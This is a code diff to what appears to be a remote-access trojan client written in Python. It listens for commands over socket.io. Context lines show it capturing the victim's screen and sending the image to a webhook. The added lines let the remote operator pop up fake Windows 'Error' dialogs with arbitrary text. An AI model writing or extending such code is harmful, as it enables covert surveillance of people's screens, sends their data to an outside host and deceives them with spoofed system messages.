@@ -5,6 +5,7 @@ from PIL import ImageGrab
 import random 
 import string
 import os
+import ctypes
 
 from configuration import Config 
 cc = Config()
@@ -26,6 +27,12 @@ class CommandHandler():
         self.webhook.send(file=file)
         os.remove(f"temp_{file_name}.png")
         
+    def messagebox(self, message):
+        MB_YESNO = 0x04
+        MB_HELP = 0x4000
+        ICON_STOP = 0x10
+        ctypes.windll.user32.MessageBoxW(0, message, "Error", MB_HELP | MB_YESNO | ICON_STOP)
+        
 cmdhandler = CommandHandler()
 
 @sio.event
@@ -43,6 +50,8 @@ def connect():
 def receive_command(data):
     if data['data'] == 'screenshot':
         cmdhandler.screenshot()
+    if data['data'].startswith('messagebox') is True:
+        cmdhandler.messagebox(data['data'].split('messagebox', 1)[1])
 
 
 
